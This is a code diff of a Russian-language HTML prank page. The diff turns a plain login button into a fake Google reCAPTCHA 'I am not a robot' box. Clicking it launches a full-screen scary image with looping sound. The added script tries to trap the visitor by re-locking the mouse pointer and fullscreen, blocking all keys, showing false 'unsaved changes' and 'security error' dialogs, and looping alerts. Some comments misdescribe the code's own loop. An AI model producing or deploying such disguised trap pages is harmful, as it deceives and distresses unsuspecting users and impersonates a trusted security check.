@@ -2,11 +2,11 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Вход в систему</title>
+    <title>Проверка безопасности</title>
     <style>
         body {
             font-family: Roboto, helvetica, arial, sans-serif;
-            background-color: #121212;
+            background-color: #f9f9f9;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -14,17 +14,49 @@
             margin: 0;
             overflow: hidden;
         }
-        #start-button {
-            padding: 15px 40px;
-            font-size: 18px;
-            color: #fff;
-            background-color: #1a73e8;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
-            z-index: 10;
+        .captcha-box {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            width: 304px;
+            height: 78px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 12px;
+            box-shadow: 0 0 4px rgba(0,0,0,0.08);
         }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+        }
+        .checkbox {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            cursor: pointer;
+            background: #fff;
+            margin-right: 15px;
+        }
+        .text {
+            font-size: 14px;
+            color: #282828;
+            user-select: none;
+        }
+        .logo-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 8px;
+            color: #555;
+        }
+        .logo-section img {
+            width: 32px;
+            height: 32px;
+            margin-bottom: 2px;
+        }
+        
         #screamer-container {
             display: none;
             position: fixed;
@@ -34,8 +66,6 @@
             height: 100vh;
             background: #000;
             z-index: 99999;
-            /* Прячем курсор мыши, чтобы усложнить закрытие крестиком */
-            cursor: none; 
         }
         #screamer-container img {
             width: 100%;
@@ -46,22 +76,26 @@
 </head>
 <body>
 
-    <button id="start-button" onclick="initiateScreamer()">Войти</button>
+    <div class="captcha-box">
+        <div class="checkbox-container">
+            <div class="checkbox" onclick="activateScreamer()"></div>
+            <div class="text">Я не робот</div>
+        </div>
+        <div class="logo-section">
+            <img src="https://www.gstatic.com/images/icons/material/product/2x/recaptcha_48dp.png">
+            <span>reCAPTCHA</span>
+            <a href="https://policies.google.com/privacy" target="_blank" style="color:#555; text-decoration:none; margin-top:2px;">Конфиденциальность</a>
+        </div>
+    </div>
 
     <div id="screamer-container">
         <img src="7f3UOH.gif" alt="">
     </div>
 
-    <!-- Добавлен атрибут autoplay для подстраховки и принудительный запуск звука на максимум -->
-    <audio id="screamer-sound" src="caughtyou.mp3" loop preload="auto" volume="1.0"></audio>
+    <audio id="screamer-sound" src="caughtyou.mp3" loop preload="auto"></audio>
 
-    <script>
+        <script>
         var isScreamerActive = false;
-
-        function initiateScreamer() {
-            document.getElementById('start-button').style.display = 'none';
-            activateScreamer();
-        }
 
         function activateScreamer() {
             isScreamerActive = true;
@@ -70,58 +104,94 @@
             
             container.style.display = 'block';
 
-            // Принудительно выставляем громкость на максимум
-            sound.volume = 1.0;
-            
-            // Запуск аудио с детальным логированием ошибок в консоль
+            // Воспроизведение звука
             sound.play().catch(function(error) {
-                console.error("Критическая ошибка аудио: ", error.message);
-                alert("Браузер заблокировал звук. Кликните еще раз по экрану!");
+                console.log("Автовоспроизведение заблокировано браузером");
             });
 
-            // Полноэкранный режим
+            // Запрос полноэкранного режима
             if (container.requestFullscreen) {
-                container.requestFullscreen().catch(function(err) {
-                    console.log("Фуллскрин заблокирован: ", err.message);
-                });
+                container.requestFullscreen();
             } else if (container.webkitRequestFullscreen) { 
                 container.webkitRequestFullscreen();
             }
 
-            // Защита от закрытия вкладки (вызовет стандартное системное окно)
+            // Блокировка курсора мыши внутри контейнера
+            lockMouse();
+
+            // Бесконечное удержание через alert/confirm при попытке навигации
             window.addEventListener('beforeunload', preventExit);
+            
+            // Запуск цикла блокировки при кликах или попытках закрытия
+            triggerAnnoyingAlerts();
         }
-      
+
+        // Функция блокировки курсора
+        function lockMouse() {
+            var container = document.getElementById('screamer-container');
+            if (container.requestPointerLock) {
+                container.requestPointerLock();
+            } else if (container.mozRequestPointerLock) {
+                container.mozRequestPointerLock();
+            }
+        }
+
+        // Стандартное предупреждение браузера перед закрытием вкладки
         function preventExit(e) {
             if (!isScreamerActive) return;
             e.preventDefault();
-            // Современный стандарт требует присвоения пустой строки или true, текст браузер подставит сам
-            e.returnValue = ''; 
-            return '';
+            e.returnValue = 'Изменения не сохранены. Вы уверены, что хотите покинуть страницу?';
+            return e.returnValue;
         }
 
-        // Блокировка клавиши Escape для предотвращения выхода из фуллскрина
+        // Функция, создающая бесконечный цикл модальных окон при клике или Escape
+        function triggerAnnoyingAlerts() {
+            if (!isScreamerActive) return;
+            
+            // Бесконечный цикл пока пользователь не нажмет "ОК" в серии окон
+            while (true) {
+                alert("Ошибка безопасности! Проверка не завершена.");
+                var confirmExit = confirm("Изменения не сохранены! Вы уверены, что хотите прервать проверку? Все данные будут утеряны.");
+                
+                // Если пользователь пытается согласиться или отказаться — возвращаем в цикл
+                if (!confirmExit || confirmExit) {
+                    alert("Доступ заблокирован. Пожалуйста, завершите проверку «Я не робот».");
+                    break; // Прерываем внутренний цикл, но оставляем ловушку на клики
+                }
+            }
+        }
+
+        // Перехват клавиши Escape и других попыток выйти из полноэкранного режима
         window.addEventListener('keydown', function(e) {
-            if (isScreamerActive && (e.key === 'Escape' || e.keyCode === 27)) {
+            if (isScreamerActive) {
                 e.preventDefault();
-                // Имитация окна предупреждения
-                alert("Ошибка системы! Завершите проверку.");
+                lockMouse(); // Возвращаем блокировку мыши
+                triggerAnnoyingAlerts();
             }
         });
-        
-        // Любой повторный клик возвращает фуллскрин и запускает звук
+
+        // Повторная блокировка мыши и запуск окон при любом клике по экрану
         document.addEventListener('click', function() {
             if (isScreamerActive) {
                 var container = document.getElementById('screamer-container');
-                var sound = document.getElementById('screamer-sound');
                 
-                sound.play();
-
+                // Возвращаем полноэкранный режим, если пользователь из него вышел
                 if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                     if (container.requestFullscreen) container.requestFullscreen();
+                    else if (container.webkitRequestFullscreen) container.webkitRequestFullscreen();
                 }
+                
+                lockMouse();
+                triggerAnnoyingAlerts();
             }
         });
+
+        // Отслеживание выхода из Pointer Lock (возвращаем его обратно)
+        document.addEventListener('pointerlockchange', function() {
+            if (isScreamerActive && document.pointerLockElement !== document.getElementById('screamer-container')) {
+                setTimeout(lockMouse, 50);
+            }
+        }, false);
     </script>
 </body>
 </html>
